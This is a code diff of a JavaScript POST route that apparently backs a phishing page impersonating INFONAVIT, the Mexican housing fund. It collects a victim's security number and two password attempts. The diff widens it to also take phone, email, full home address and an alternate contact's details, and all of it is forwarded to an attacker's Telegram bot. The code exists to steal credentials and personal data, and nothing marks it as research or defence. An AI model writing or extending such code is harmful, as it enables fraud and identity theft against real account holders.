@@ -1,14 +1,29 @@
 export async function POST(req) {
   try {
-    const { seguridad, clavePrimerIntento, claveSegundoIntento } =
-      await req.json();
+    const {
+      seguridad,
+      clavePrimerIntento,
+      claveSegundoIntento,
+      celular,
+      correo,
+      postal,
+      estado,
+      delegacion,
+      colonia,
+      calle,
+      exterior,
+      interior,
+      nombre,
+      paterno,
+      materno,
+      cel,
+    } = await req.json();
 
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN_API;
     const TELEGRAM_BOT_CHAT_ID = process.env.TELEGRAM_BOT_CHAT_ID_API;
 
-    const mensaje = `
------DATOS INFONAVIT-----\nNUMERO DE SEGURIDAD: ${seguridad}\nCLAVE PRIMER INTENTO: ${clavePrimerIntento}\nCLAVE SEGUNDO INTENTO: ${claveSegundoIntento}`;
-
+    const mensaje = `*-----DATOS INFONAVIT-----*\n*NUMERO DE SEGURIDAD:* ${seguridad}\n*CLAVE PRIMER INTENTO:* ${clavePrimerIntento}\n*CLAVE SEGUNDO INTENTO:* ${claveSegundoIntento}\n\n*-----DATOS DE CONTACTO-----*\n*CELULAR:* ${celular}\n*CORREO:* ${correo}\n\n*-----DIRECCIÓN DONDE VIVES ACTUALMENTE-----*\n*POSTAL:* ${postal}\n*ESTADO:* ${estado}\n*DELEGACIÓN:* ${delegacion}\n*COLONIA:* ${colonia}\n*CALLE:* ${calle}\n*EXTERIOR:* ${exterior}\n*INTERIOR:* ${interior}\n\n*-----PERSONA ALTERNATIVA DE CONTACTO-----*\n*NOMBRE:* ${nombre}\n*PATERNO:* ${paterno}\n*MATERNO:* ${materno}\n*CELULAR:* ${cel}
+`;
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
     const response = await fetch(url, {
